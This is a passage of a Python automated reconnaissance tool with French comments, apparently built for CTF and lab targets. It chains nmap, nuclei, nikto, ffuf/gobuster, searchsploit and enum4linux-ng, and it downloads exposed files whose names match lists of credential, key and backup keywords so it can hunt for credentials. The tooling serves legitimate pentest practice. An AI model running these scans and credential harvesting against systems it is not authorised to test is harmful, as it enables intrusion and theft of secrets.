        warn("Nuclei activé mais absent -> désactivation.")
        cfg.run_nuclei = False

    if cfg.run_enum4linux and not which("enum4linux-ng"):
        warn("enum4linux-ng activé mais absent -> désactivation.")
        cfg.run_enum4linux = False

    if cfg.use_ffuf and not which("ffuf"):
        warn("ffuf activé mais absent -> fallback gobuster.")
        cfg.use_ffuf = False

    # ── Wordlist : affiche l'état et taille ──
    if cfg.wordlist.exists():
        size_kb = cfg.wordlist.stat().st_size // 1024
        seclists = "seclists" in str(cfg.wordlist).lower()
        wl_label = f"[green]✓ {cfg.wordlist.name}[/green] ({size_kb} Ko)" if RICH else f"✓ {cfg.wordlist.name} ({size_kb} Ko)"
        if not seclists and size_kb < 50:
            wl_label += (" [yellow]⚠ petite liste[/yellow]" if RICH else " ⚠ petite liste")
        if RICH:
            console.print(f"  Wordlist: {wl_label}")
        else:
            print(f"  Wordlist: {cfg.wordlist.name} ({size_kb} Ko)")
    else:
        warn(f"Wordlist introuvable: {cfg.wordlist} -> gobuster/ffuf SKIP")

# -------------------- NMAP PARSE --------------------
def parse_nmap_xml(xml_path: Path) -> List[dict]:
    services: List[dict] = []
    if not xml_path.exists():
        return services
    try:
        root = ET.parse(xml_path).getroot()
        for host in root.findall("host"):
            st = host.find("status")
            if st is not None and st.get("state") != "up":
                continue
            ports = host.find("ports")
            if ports is None:
                continue
            for port in ports.findall("port"):
                pst = port.find("state")
                if pst is None or pst.get("state") != "open":
                    continue
                svc = port.find("service")
                # Correctif v0.64.1 : attrib.get() renvoie None si l'attribut est
                # absent (fréquent quand -sV n'identifie pas le service). On force
                # des chaînes vides pour éviter des None qui faussent les
                # comparaisons en aval (.lower(), tri, matching SMB/HTTP).
                try:
                    portid = int(port.get("portid"))
                except (TypeError, ValueError):
                    continue
                services.append(
                    {
                        "port": portid,
                        "proto": port.get("protocol") or "tcp",
                        "name": (svc.get("name") if svc is not None else "") or "",
                        "product": (svc.get("product") if svc is not None else "") or "",
                        "version": (svc.get("version") if svc is not None else "") or "",
                        "extrainfo": (svc.get("extrainfo") if svc is not None else "") or "",
                    }
                )
        services.sort(key=lambda x: (x["port"], x.get("proto") or ""))
    except Exception as ex:
        eprint(f"Failed parsing nmap XML: {ex}")
    return services

def _ports_arg(services: List[dict]) -> Optional[str]:
    ports = sorted({int(s["port"]) for s in services if isinstance(s.get("port"), int)})
    return ",".join(str(p) for p in ports) if ports else None

# -------------------- WEB PROBE (fast) --------------------
def _probe_http_on_socket(host: str, port: int, use_ssl: bool, timeout: float = 4.0) -> bool:
    # Correctif v0.64.1 : timeout par défaut relevé (1.2s → 4.0s). Sur une cible
    # distante (THM/HTB derrière un VPN, RTT élevé) 1.2s expirait souvent et le
    # service web n'était pas démarré en mode "early" → résultats web manquants.
    req = f"HEAD / HTTP/1.0\r\nHost: {host}\r\nUser-Agent: pentool\r\nConnection: close\r\n\r\n".encode()
    s: Optional[socket.socket] = None
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.settimeout(timeout)
        s.sendall(req)
        # Lecture tolérante : on accumule jusqu'à voir le préfixe "HTTP/"
        # (certains serveurs renvoient la ligne de statut en plusieurs segments).
        data = b""
        for _ in range(4):
            chunk = s.recv(64)
            if not chunk:
                break
            data += chunk
            if len(data) >= 5:
                break
        return data.startswith(b"HTTP/")
    except Exception:
        return False
    finally:
        try:
            if s:
                s.close()
        except Exception:
            pass

def guess_scheme(host: str, port: int, timeout: float = 4.0) -> Optional[str]:
    prefer_https = port in (443, 8443, 9443, 10443)
    order = [True, False] if prefer_https else [False, True]
    for use_ssl in order:
        if _probe_http_on_socket(host, port, use_ssl=use_ssl, timeout=timeout):
            return "https" if use_ssl else "http"
    return None

def url_from_host_port(host: str, port: int, scheme: str) -> str:
    if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
        return f"{scheme}://{host}"
    return f"{scheme}://{host}:{port}"

# -------------------- WEB ENUM RUNNER (throttled) --------------------
class WebEnumRunner:
    def __init__(self, cfg: Config, logs_dir: Path):
        self.cfg = cfg
        self.logs_dir = logs_dir
        self.results: Dict[str, List[str]] = {"whatweb": [], "nikto": [], "gobuster": [], "ffuf": []}
        self._urls_seen: set[str] = set()
        self._lock = threading.Lock()

        self.do_whatweb = which("whatweb")
        self.do_nikto = which("nikto") and not cfg.no_nikto
        self.do_gobuster = which("gobuster") and cfg.wordlist.exists() and not cfg.use_ffuf
        self.do_ffuf = which("ffuf") and cfg.wordlist.exists() and cfg.use_ffuf

        self._url_sem = threading.BoundedSemaphore(max(1, cfg.max_web_urls))
        self._gobuster_sem = threading.BoundedSemaphore(max(1, cfg.max_gobuster))

        self._exe = ThreadPoolExecutor(max_workers=max(2, cfg.threads))
        self._futures: List[Future] = []

        self._port_q: "queue.Queue[int]" = queue.Queue()
        self._stop = threading.Event()
        self._worker_t = threading.Thread(target=self._port_worker, daemon=True)

    @property
    def urls(self) -> List[str]:
        with self._lock:
            return sorted(self._urls_seen)

    def start(self) -> None:
        if not self.cfg.web_early:
            return
        self._worker_t.start()

    def stop(self) -> None:
        self._stop.set()
        try:
            self._port_q.put_nowait(-1)
        except Exception as _exc:
            warn(f"[url_from_host_port] {_exc}")

    def submit_open_port(self, port: int) -> None:
        if self.cfg.no_web or (not self.cfg.web_early):
            return
        if port <= 0:
            return
        # Accepte les ports web connus + tout port > 1024 non-SMB/FTP
        # (ex: 32768, 8888, etc. peuvent être des services web non-standard)
        non_web = {21, 22, 23, 25, 53, 110, 111, 139, 143, 389, 445, 636, 993, 995, 3306, 5432}
        if port not in COMMON_WEB_PORTS and (port <= 1024 or port in non_web):
            return
        try:
            self._port_q.put_nowait(port)
        except Exception as _exc:
            warn(f"[url_from_host_port] {_exc}")

    def submit_url(self, url: str) -> None:
        if self.cfg.no_web:
            return
        url = (url or "").strip()
        if not url:
            return
        with self._lock:
            if url in self._urls_seen:
                return
            self._urls_seen.add(url)

        fut = self._exe.submit(self._process_url_pipeline, url)
        self._futures.append(fut)

    def _port_worker(self) -> None:
        while not self._stop.is_set():
            try:
                port = self._port_q.get(timeout=0.2)
            except queue.Empty:
                continue
            if port == -1:
                break

            scheme = guess_scheme(self.cfg.target, port,
                                  timeout=getattr(self.cfg, "probe_timeout", 4.0))
            if not scheme:
                continue
            u = url_from_host_port(self.cfg.target, port, scheme)
            self.submit_url(u)

    def _process_url_pipeline(self, url: str) -> None:
        with self._url_sem:
            if self.do_whatweb:
                out = self.logs_dir / f"whatweb_{safe_name(url)}.txt"
                run_cmd(
                    ["whatweb", "-v", "--color=never", url],
                    out,
                    timeout=self.cfg.web_timeout_short,
                    label=f"whatweb {url}",
                    verbose=self.cfg.verbose,
                )
                self.results["whatweb"].append(str(out))

            if self.do_nikto:
                out = self.logs_dir / f"nikto_{safe_name(url)}.txt"
                run_cmd(
                    ["nikto", "-h", url],
                    out,
                    timeout=self.cfg.web_timeout_long,
                    label=f"nikto {url}",
                    verbose=self.cfg.verbose,
                )
                self.results["nikto"].append(str(out))

            if self.do_gobuster:
                with self._gobuster_sem:
                    out = self.logs_dir / f"gobuster_{safe_name(url)}.txt"
                    run_cmd(
                        ["gobuster", "dir", "-u", url, "-w", str(self.cfg.wordlist), "-q", "-t", str(self.cfg.gobuster_threads)],
                        out,
                        timeout=self.cfg.web_timeout_long,
                        label=f"gobuster {url}",
                        verbose=self.cfg.verbose,
                    )
                    self.results["gobuster"].append(str(out))

            if self.do_ffuf:
                with self._gobuster_sem:
                    out = self.logs_dir / f"ffuf_{safe_name(url)}.txt"
                    out_csv = self.logs_dir / f"ffuf_{safe_name(url)}.csv"
                    run_cmd(
                        [
                            "ffuf",
                            "-u", f"{url}/FUZZ",
                            "-w", str(self.cfg.wordlist),
                            "-t", str(self.cfg.ffuf_threads),
                            "-mc", "200,204,301,302,307,401,403",
                            "-fc", "404",
                            # BUG FIX v0.65.1 : -sf (stop-on-spurious) stoppait ffuf
                            # immédiatement (0 req/sec) quand le serveur renvoie des
                            # réponses homogènes (calibration = toutes identiques).
                            # Supprimé : -ac seul suffit pour l'auto-calibration.
                            "-ac",           # Auto-calibrate filtering (sans -sf)
                            "-noninteractive",
                            "-of", "csv",
                            "-o", str(out_csv),  # BUG FIX : -of sans -o = CSV dans stdout mélangé au log
                        ],
                        out,
                        timeout=self.cfg.web_timeout_long,
                        label=f"ffuf {url}",
                        verbose=self.cfg.verbose,
                    )
                    self.results["ffuf"].append(str(out_csv))

    def wait(self) -> Dict[str, List[str]]:
        for f in as_completed(self._futures):
            try:
                f.result()
            except Exception as ex:
                warn(f"web job erreur: {ex}")
        return self.results

    def shutdown(self) -> None:
        self.stop()
        try:
            self._exe.shutdown(wait=True, cancel_futures=False)
        except Exception as _exc:
            warn(f"[url_from_host_port] {_exc}")

# -------------------- NMAP (FAST) — PASS 1 / PASS 2 --------------------
def _nmap_grepable_on_line_factory(on_open_port: Callable[[int], None]) -> Callable[[str], None]:
    seen: set[int] = set()
    def _cb(line: str) -> None:
        if "Ports:" not in line:
            return
        if "/open/" not in line:
            return
        m = re.search(r"Ports:\s*(.*)", line)
        if not m:
            return
        ports_part = m.group(1)
        for chunk in ports_part.split(","):
            chunk = chunk.strip()
            if not chunk:
                continue
            if "/open/" not in chunk:
                continue
            try:
                p = int(chunk.split("/")[0])
            except Exception:
                continue
            if p in seen:
                continue
            seen.add(p)
            try:
                on_open_port(p)
            except Exception as _exc:
                warn(f"[_nmap_grepable_on_line_factory] {_exc}")
    return _cb

def nmap_ports_discovery(cfg: Config, logs_dir: Path, on_open_port: Optional[Callable[[int], None]] = None) -> Path:
    out_xml = logs_dir / "nmap_ports.xml"
    out_nmap = logs_dir / "nmap_ports.nmap"
    cmdlog = logs_dir / "nmap_ports_cmd.txt"

    scan_flag = "-sS" if _is_root() else "-sT"
    if scan_flag == "-sT":
        warn("Non-root détecté: utilisation de -sT (connect scan). Pour -sS, lance avec sudo.")

    cmd = ["nmap", scan_flag, "--open", "-oX", str(out_xml), "-oN", str(out_nmap)]
    on_line = None
    if on_open_port is not None:
        cmd += ["-oG", "-"]
        on_line = _nmap_grepable_on_line_factory(on_open_port)

    cmd += ["--min-rate", str(cfg.min_rate), "--max-retries", str(cfg.max_retries)]
    if cfg.host_timeout:
        cmd += ["--host-timeout", cfg.host_timeout]
    if cfg.stats_every:
        cmd += ["--stats-every", cfg.stats_every]

    if cfg.no_dns:
        cmd.append("-n")
    if cfg.pn:
        cmd.append("-Pn")

    if cfg.scan_mode in ("quick", "pentest"):
        cmd += ["--top-ports", str(DEFAULT_TOP_PORTS)]
    else:
        cmd += ["-p-"]

    if cfg.extra_nmap_args:
        cmd += cfg.extra_nmap_args

    cmd.append(cfg.target)

    info(f"Étape 1/4 — Nmap ports discovery ({cfg.scan_mode}, staged)")
    run_cmd(cmd, cmdlog, timeout=cfg.nmap_timeout, label="nmap ports", verbose=cfg.verbose, on_line=on_line)
    return out_xml

def nmap_enum_services(cfg: Config, ports: str, logs_dir: Path) -> Tuple[Path, Path]:
    out_xml = logs_dir / "nmap_enum.xml"
    out_nmap = logs_dir / "nmap_enum.nmap"
    cmdlog = logs_dir / "nmap_enum_cmd.txt"

    cmd = ["nmap", "-p", ports, "--open", "-oX", str(out_xml), "-oN", str(out_nmap)]

    if cfg.enum_default_scripts:
        cmd.append("-sC")
    cmd.append("-sV")
    if cfg.version_light:
        cmd.append("--version-light")

    if cfg.no_dns:
        cmd.append("-n")
    if cfg.pn:
        cmd.append("-Pn")

    if cfg.stats_every:
        cmd += ["--stats-every", cfg.stats_every]

    if cfg.extra_nmap_args:
        cmd += cfg.extra_nmap_args

    cmd.append(cfg.target)

    info("Étape 2/4 — Nmap enum ciblée (ports ouverts)")
    run_cmd(cmd, cmdlog, timeout=cfg.enum_timeout, label="nmap enum", verbose=cfg.verbose)
    return out_xml, out_nmap

def nmap_single_pass(cfg: Config, logs_dir: Path, on_open_port: Optional[Callable[[int], None]] = None) -> Tuple[Path, Path]:
    nmap_xml = logs_dir / "nmap.xml"
    nmap_out = logs_dir / "nmap.nmap"
    cmdlog = logs_dir / "nmap_cmd.txt"

    cmd = ["nmap", "-sV", "--open", "-oX", str(nmap_xml), "-oN", str(nmap_out)]
    if cfg.enum_default_scripts:
        cmd.insert(1, "-sC")

    on_line = None
    if on_open_port is not None:
        cmd += ["-oG", "-"]
        on_line = _nmap_grepable_on_line_factory(on_open_port)

    if cfg.no_dns:
        cmd.append("-n")
    if cfg.pn:
        cmd.append("-Pn")

    if cfg.scan_mode in ("quick", "pentest"):
        cmd += ["--top-ports", str(DEFAULT_TOP_PORTS), "--min-rate", str(cfg.min_rate)]
    else:
        cmd += ["-p-"]

    if cfg.stats_every:
        cmd += ["--stats-every", cfg.stats_every]

    if cfg.extra_nmap_args:
        cmd += cfg.extra_nmap_args

    cmd.append(cfg.target)

    info(f"Étape 1/4 — Nmap scan ({cfg.scan_mode}, single-pass)")
    run_cmd(cmd, cmdlog, timeout=cfg.nmap_timeout, label="nmap scan", verbose=cfg.verbose, on_line=on_line)
    return nmap_xml, nmap_out

# -------------------- VULN CHECK (DETECTION ONLY) --------------------
def run_nmap_vuln(cfg: Config, services: List[dict], logs_dir: Path) -> Optional[dict]:
    if cfg.no_vuln:
        return None

    ports = _ports_arg(services)
    if cfg.vuln_mode == "targeted" and not ports:
        warn("Aucun port ouvert détecté -> vuln scan SKIP")
        return None

    vuln_out = logs_dir / "nmap_vuln.nmap"
    vuln_xml = logs_dir / "nmap_vuln.xml"
    cmdlog = logs_dir / "nmap_vuln_cmd.txt"

    cmd = ["nmap", "-sV", "--script", "vuln", "--open", "-oN", str(vuln_out), "-oX", str(vuln_xml)]
    if cfg.no_dns:
        cmd.append("-n")
    if cfg.pn:
        cmd.append("-Pn")

    if cfg.vuln_mode == "targeted":
        cmd += ["-p", ports]
    else:
        cmd += ["-p-"]

    if cfg.stats_every:
        cmd += ["--stats-every", cfg.stats_every]

    if cfg.extra_nmap_args:
        cmd += cfg.extra_nmap_args

    cmd.append(cfg.target)

    info(f"Étape 3/4 — Nmap vuln (mode: {cfg.vuln_mode}, détection uniquement)")
    run_cmd(cmd, cmdlog, timeout=cfg.vuln_timeout, label="nmap vuln", verbose=cfg.verbose)

    cve_count, vul_count = 0, 0
    try:
        # Correctif v0.64.1 : on nettoie les couleurs ANSI puis on compte les
        # vulnérabilités CONFIRMÉES uniquement. L'ancien `findall("VULNERABLE")`
        # comptait aussi "NOT VULNERABLE", "LIKELY VULNERABLE" et les répétitions
        # d'état → total incohérent d'une machine/version NSE à l'autre.
        text = strip_ansi(vuln_out.read_text(encoding="utf-8", errors="replace"))
        cve_count = len(set(re.findall(r"CVE-\d{4}-\d{4,7}", text)))
        for line in text.splitlines():
            up = line.upper()
            if "VULNERABLE" in up and "NOT VULNERABLE" not in up and "LIKELY VULNERABLE" not in up:
                vul_count += 1
    except Exception as _exc:
        warn(f"[run_nmap_vuln] {_exc}")

    title = "Nmap NSE vuln scripts exécutés (à valider)"
    if cve_count or vul_count:
        title += f" — CVE uniques: {cve_count}, mentions VULNERABLE: {vul_count}"

    return {"severity": "info", "title": title, "source": "nmap", "evidence_file": str(vuln_out)}

# -------------------- SEARCHSPLOIT (REFERENCES ONLY) --------------------
def run_searchsploit(cfg: Config, nmap_xml: Path, logs_dir: Path) -> Optional[dict]:
    if not cfg.run_searchsploit:
        return None
    if not which("searchsploit"):
        return None
    if not nmap_xml.exists():
        return None

    out = logs_dir / "searchsploit_nmap.txt"
    cmdlog = logs_dir / "searchsploit_cmd.txt"

    # Correctif v0.64.1 : env neutre (locale + couleurs coupées) pour une sortie
    # identique partout. searchsploit lit ~/.searchsploit_rc : base_env conserve HOME.
    env = base_env()

    info("Étape 3b/4 — Searchsploit (références Exploit-DB via --nmap)")
    rc = run_cmd(["searchsploit", "--nmap", str(nmap_xml)], cmdlog, timeout=600, label="searchsploit", verbose=cfg.verbose, env=env)

    try:
        out.write_text(cmdlog.read_text(encoding="utf-8", errors="replace"), encoding="utf-8", errors="replace")
    except Exception as _exc:
        warn(f"[run_searchsploit] {_exc}")

    if rc != 0:
        warn("searchsploit a échoué (voir logs).")
        return {"severity": "info", "title": "Searchsploit exécuté mais erreur (voir logs)", "source": "searchsploit", "evidence_file": str(cmdlog)}

    hits = 0
    try:
        # Correctif v0.64.1 : comptage fiable des résultats. On ne compte une
        # ligne que si c'est une vraie ligne de résultat : présence de "|",
        # cellule de droite ressemblant à un chemin Exploit-DB (contient "/"),
        # en excluant les en-têtes ("Exploit Title"/"Path"), les séparateurs
        # (tirets) et les lignes d'info "[i]"/"[-]". Bien plus stable que
        # l'ancien `"|" in l` qui comptait bordures et titres de colonnes.
        txt = strip_ansi(out.read_text(encoding="utf-8", errors="replace"))
        for raw in txt.splitlines():
            l = raw.strip()
            if not l or l.startswith("[") or "|" not in l:
                continue
            cells = [c.strip() for c in l.split("|")]
            if len(cells) < 2:
                continue
            title, path = cells[0], cells[-1]
            if title in ("Exploit Title", "Shellcode Title") or path in ("Path", "URL"):
                continue
            if set(title) <= set("- "):   # ligne de séparation
                continue
            if "/" in path and path:
                hits += 1
    except Exception as _exc:
        warn(f"[run_searchsploit] {_exc}")

    return {"severity": "info", "title": f"Searchsploit mapping (hits approx: {hits})", "source": "searchsploit", "evidence_file": str(out)}

# -------------------- NUCLEI (MODERN VULN SCANNER) --------------------
def run_nuclei_scan(cfg: Config, urls: List[str], services: List[dict], logs_dir: Path) -> Optional[dict]:
    """
    Lance Nuclei sur les URLs web ET/OU sur l'IP directe.
    Nuclei utilise des templates communautaires (10k+) pour détecter
    des vulnérabilités connues, misconfigurations, expositions.

    Avantages vs Nmap NSE vuln :
    - 10x plus de signatures
    - Moins de faux positifs
    - Templates mis à jour quotidiennement par la communauté
    - Output structuré (JSON, SARIF)
    """
    if not cfg.run_nuclei:
        return None
    if not which("nuclei"):
        return None

    targets: List[str] = []
    # URLs web détectées
    targets.extend(urls)

    # Vérifier quels ports web standard sont détectés
    # On n'ajoute PAS les ports non-standard (>1024) à nuclei :
    # même s'ils répondent HTTP, nuclei lance 10000+ templates dessus
    # et chaque timeout de 10s × N templates = dépassement garanti du timeout global.
    # Les ports non-standard sont explorés séparément par web crawl/WhatWeb.
    http_ports_found = []
    for svc in services:
        p = svc.get("port", 0)
        sname = (svc.get("name") or "").lower()
        if p in COMMON_WEB_PORTS or "http" in sname or "web" in sname:
            http_ports_found.append(p)

    # Nuclei se lance uniquement si des URLs ont été découvertes par WhatWeb/web-enum
    if not urls and not http_ports_found:
        warn("Nuclei: aucun service HTTP confirmé → SKIP")
        return None

    if not targets:
        warn("Nuclei: aucune cible -> SKIP")
        return None

    targets_file = logs_dir / "nuclei_targets.txt"
    targets_file.write_text("\n".join(targets), encoding="utf-8")

    out_txt = logs_dir / "nuclei_results.txt"
    out_json = logs_dir / "nuclei_results.jsonl"
    cmdlog = logs_dir / "nuclei_cmd.txt"

    cmd = [
        "nuclei",
        "-l", str(targets_file),
        "-o", str(out_txt),
        "-jsonl", str(out_json),
        "-severity", cfg.nuclei_severity,
        "-silent",
        "-no-color",
        "-timeout", "8",          # 8s par requête (CTF : cibles parfois lentes)
        "-retries", "1",
        "-bulk-size", "25",
        "-concurrency", "10",
        "-max-host-error", "15",  # Skip un host après 15 erreurs consécutives
        "-no-interactsh",         # Désactive les callbacks OOB (ralentissent sur CTF)
    ]

    info(f"Nuclei vuln scan (severity: {cfg.nuclei_severity}, {len(targets)} cible(s))")
    rc = run_cmd(cmd, cmdlog, timeout=cfg.nuclei_timeout, label="nuclei", verbose=cfg.verbose)

    # Comptage des résultats
    vuln_count = 0
    severities: Dict[str, int] = {}
    try:
        if out_json.exists():
            for line in out_json.read_text(encoding="utf-8", errors="replace").splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    j = json.loads(line)
                    sev = (j.get("info", {}).get("severity") or "unknown").lower()
                    severities[sev] = severities.get(sev, 0) + 1
                    vuln_count += 1
                except Exception as _exc:
                    warn(f"[run_nuclei_scan] {_exc}")
        elif out_txt.exists():
            vuln_count = len([l for l in strip_ansi(out_txt.read_text(encoding="utf-8", errors="replace")).splitlines() if l.strip()])
    except Exception as _exc:
        warn(f"[run_nuclei_scan] {_exc}")

    sev_summary = ", ".join(f"{k}:{v}" for k, v in sorted(severities.items())) if severities else "aucun"
    title = f"Nuclei scan ({vuln_count} finding(s): {sev_summary})"

    # Sévérité du finding basée sur le pire résultat
    finding_sev = "info"
    if severities.get("critical"):
        finding_sev = "critical"
    elif severities.get("high"):
        finding_sev = "high"
    elif severities.get("medium"):
        finding_sev = "medium"

    return {
        "severity": finding_sev,
        "title": title,
        "source": "nuclei",
        "evidence_file": str(out_json if out_json.exists() else out_txt),
        "vuln_count": vuln_count,
        "severities": severities,
    }


# -------------------- ENUM4LINUX-NG (SMB ENUMERATION) --------------------
def _has_smb(services: List[dict]) -> bool:
    """Détecte si des services SMB/NetBIOS sont présents."""
    for s in services:
        port = int(s.get("port", 0))
        name = (s.get("name") or "").lower()
        if port in SMB_PORTS or any(n in name for n in SMB_SERVICE_NAMES):
            return True
    return False


def run_enum4linux_ng(cfg: Config, services: List[dict], logs_dir: Path) -> Optional[dict]:
    """
    Lance enum4linux-ng quand des services SMB sont détectés.

    enum4linux-ng extrait automatiquement :
    - Shares SMB accessibles (lecture/écriture anonyme)
    - Utilisateurs du domaine (RID cycling, LDAP)
    - Policies de mot de passe
    - Groupes et OS info
    - Sessions null (accès anonyme)

    C'est souvent le premier vecteur d'entrée sur HTB/OSCP.
    """
    if not cfg.run_enum4linux:
        return None
    if not which("enum4linux-ng"):
        return None
    if not _has_smb(services):
        info("enum4linux-ng: aucun service SMB détecté -> SKIP")
        return None

    out = logs_dir / "enum4linux_ng.txt"
    out_json = logs_dir / "enum4linux_ng.json"
    cmdlog = logs_dir / "enum4linux_cmd.txt"

    cmd = [
        "enum4linux-ng",
        "-A",                   # All enumeration
        "-oJ", str(out_json.with_suffix("")),  # JSON output (sans extension, l'outil l'ajoute)
        cfg.target,
    ]

    info(f"enum4linux-ng — énumération SMB/NetBIOS ({cfg.target})")
    rc = run_cmd(cmd, cmdlog, timeout=cfg.web_timeout_long, label="enum4linux-ng", verbose=cfg.verbose)

    # Copier la sortie cmd comme fallback texte
    try:
        if cmdlog.exists():
            out.write_text(cmdlog.read_text(encoding="utf-8", errors="replace"), encoding="utf-8", errors="replace")
    except Exception as _exc:
        warn(f"[run_enum4linux_ng] {_exc}")

    # Analyser les résultats
    shares_count = 0
    users_count = 0
    null_session = False

    # Correctif v0.64.1 — le schéma JSON d'enum4linux-ng VARIE selon la version
    # (la clé "null_session_possible" n'existe pas partout). On fait donc une
    # lecture best-effort du JSON ET on confirme la session nulle via la sortie
    # texte (phrase canonique), ce qui marche quelle que soit la version.
    def _count_entries(obj) -> int:
        # Compte les vraies entrées d'un conteneur (dict/list), en ignorant les
        # messages d'erreur que l'outil place parfois à la place des données.
        if isinstance(obj, dict):
            return sum(1 for k in obj.keys() if not str(k).lower().startswith("error"))
        if isinstance(obj, list):
            return len(obj)
        return 0

    txt = ""
    try:
        txt = strip_ansi(out.read_text(encoding="utf-8", errors="replace")) if out.exists() else ""
    except Exception:
        txt = ""

    try:
        actual_json = out_json if out_json.exists() else out_json.with_suffix(".json")
        if actual_json.exists():
            data = json.loads(actual_json.read_text(encoding="utf-8", errors="replace"))
            if isinstance(data, dict):
                shares_count = _count_entries(data.get("shares"))
                users_count = _count_entries(data.get("users"))
                # Session nulle : plusieurs clés possibles selon la version.
                for key in ("null_session_possible", "null_session", "sessions",
                            "smb_anonymous", "anonymous"):
                    val = data.get(key)
                    if isinstance(val, bool) and val:
                        null_session = True
                    elif isinstance(val, str) and ("ok" in val.lower() or "true" in val.lower()
                                                   or "allow" in val.lower()):
                        null_session = True
                    elif isinstance(val, dict) and val:
                        null_session = True
    except Exception as _exc:
        warn(f"[run_enum4linux_ng] {_exc}")

    # Confirmation/repli par le texte (indépendant de la version JSON).
    low = txt.lower()
    if not null_session:
        if ("session using username ''" in low
                or "null session" in low
                or "anonymous login successful" in low):
            null_session = True
    if shares_count == 0:
        # Comptage best-effort des partages depuis le texte : on s'appuie sur la
        # colonne "Type" du listing smbclient/enum4linux (Disk/IPC/Printer en 2e
        # colonne), bien plus précis que l'ancien count("share") qui comptait le
        # mot partout (et qu'un simple regex Disk|IPC surcompterait par ligne).
        for line in txt.splitlines():
            toks = line.split()
            if len(toks) >= 2 and toks[1] in ("Disk", "IPC", "Printer"):
                shares_count += 1
    if users_count == 0:
        # rpcclient/enum4linux listent les comptes au format "user:[nom] rid:[...]".
        users_count = len(re.findall(r"rid:\[0x", txt, flags=re.IGNORECASE))

    details = []
    if shares_count:
        details.append(f"{shares_count} share(s)")
    if users_count:
        details.append(f"{users_count} user(s)")
    if null_session:
        details.append("NULL session possible!")

    detail_str = ", ".join(details) if details else "aucun résultat exploitable"
    finding_sev = "high" if null_session else ("medium" if shares_count or users_count else "info")

    return {
        "severity": finding_sev,
        "title": f"enum4linux-ng ({detail_str})",
        "source": "enum4linux-ng",
        "evidence_file": str(out),
        "shares_count": shares_count,
        "users_count": users_count,
        "null_session": null_session,
    }

# -------------------- FFUF FOLLOWUP (auto-explore findings) --------------------

# Extensions considérées comme intéressantes à télécharger
_INTERESTING_EXT = {
    ".zip", ".tar", ".gz", ".tgz", ".tar.gz", ".7z", ".rar", ".bz2",
    ".bak", ".backup", ".old", ".orig", ".swp", ".sql", ".dump",
    ".txt", ".md", ".cfg", ".conf", ".config", ".ini", ".env",
    ".xml", ".json", ".yaml", ".yml",
    ".key", ".pem", ".crt", ".p12", ".pfx", ".asc", ".gpg",
    ".php.bak", ".asp.bak", ".aspx.bak",
    ".xlsx", ".csv", ".xls",
}

# Mots-clés dans les noms de fichiers/dossiers jugés sensibles
_INTERESTING_NAMES = {
    "backup", "backups", "back", "bak",
    "database", "db", "dump", "sql",
    "config", "conf", "settings", "setup",
    "secret", "secrets", "cred", "creds", "credentials", "password", "passwd",
    "private", "priv", "key", "token",
    "admin", "panel", "manage", "console",
    "upload", "uploads", "files", "data",
}


def _is_interesting_url(url: str) -> bool:
    """Retourne True si l'URL pointe vers un fichier/dossier potentiellement sensible."""
    path = url.split("?")[0].lower()
    name = path.rstrip("/").rsplit("/", 1)[-1]
    # Extension intéressante
    for ext in _INTERESTING_EXT:
        if path.endswith(ext):
            return True
    # Nom de fichier/dossier intéressant
    for kw in _INTERESTING_NAMES:
        if kw in name:
            return True
    return False


def _parse_ffuf_csvs(web_logs: Dict[str, List[str]]) -> List[Tuple[str, str]]:
    """
    Lit les CSV ffuf et retourne une liste de (url, status_code).
    Suit les redirections (utilise la colonne redirect si présente).
    """
    found: List[Tuple[str, str]] = []
    seen: set = set()
    for csv_path in web_logs.get("ffuf", []):
        p = Path(csv_path)
        if not p.exists():
            continue
        try:
            lines = p.read_text(encoding="utf-8", errors="replace").splitlines()
            for line in lines[1:]:   # skip header
                line = line.strip()
                if not line:
                    continue
                cols = line.split(",")
                if len(cols) < 5:
                    continue
                fuzz_val  = cols[0]
                url_orig  = cols[1]
                redirect  = cols[2]
                status    = cols[4]
                final_url = redirect.strip() if redirect.strip() else url_orig.strip()
                if final_url and final_url not in seen:
                    seen.add(final_url)
                    found.append((final_url, status))
        except Exception as _exc:
            warn(f"[_parse_ffuf_csvs] {_exc}")
    return found


def run_ffuf_followup(
    cfg: Config,
    web_logs: Dict[str, List[str]],
    logs_dir: Path,
) -> Tuple[List[str], List[dict]]:
    """
    Phase post-ffuf : explore chaque répertoire/fichier découvert.

    Actions :
    1. Visite chaque URL trouvée par ffuf.
    2. Détecte les directory listings Apache/Nginx.
    3. Télécharge les fichiers jugés intéressants (archives, backups, configs).
    4. Cherche des credentials dans les fichiers texte téléchargés.
    5. Retourne (nouvelles_urls_découvertes, findings).
    """
    found_urls = _parse_ffuf_csvs(web_logs)
    if not found_urls:
        return [], []

    info(f"[ffuf followup] Exploration de {len(found_urls)} résultat(s) ffuf")

    new_urls: List[str] = []
    findings: List[dict] = []
    download_dir = logs_dir / "ffuf_downloads"
    report_path  = logs_dir / "ffuf_followup.txt"
    report_lines: List[str] = [f"# ffuf followup — {now_iso()}", ""]

    try:
        import urllib.request as _ur
        import urllib.error  as _ue
        import html as _html_mod
    except ImportError:
        warn("[ffuf followup] urllib manquant — SKIP")
        return [], []

    # ── Helper : GET simple via urllib (pas de dépendance requests) ──
    def _get(url: str, timeout: float = 8.0) -> Optional[Tuple[int, str]]:
        """Retourne (status_code, body_text) ou None si erreur."""
        try:
            req = _ur.Request(url, headers={"User-Agent": "pentool/0.66"})
            with _ur.urlopen(req, timeout=timeout) as resp:  # type: ignore[arg-type]
                body = resp.read(512_000).decode("utf-8", errors="replace")
                return resp.status, body
        except _ue.HTTPError as e:
            try:
                body = e.read(512_000).decode("utf-8", errors="replace")
                return e.code, body
            except Exception:
                return e.code, ""
        except Exception:
            return None

    def _download(url: str, dest: Path) -> bool:
        """Télécharge url → dest. Retourne True si succès."""
        try:
            download_dir.mkdir(parents=True, exist_ok=True)
            req = _ur.Request(url, headers={"User-Agent": "pentool/0.66"})
            with _ur.urlopen(req, timeout=15) as resp:  # type: ignore[arg-type]
                data = resp.read(10_000_000)   # max 10 Mo
            dest.write_bytes(data)
            return True
        except Exception:
            return False

    def _extract_dir_links(base_url: str, body: str) -> List[str]:
        """Extrait les liens relatifs d'un directory listing HTML."""
        links = []
        base_url = base_url.rstrip("/")
        for href in re.findall(r'href=["\']([^"\'?#]+)["\']', body):
            if href in ("../", "/", "./", "?", ""):
                continue
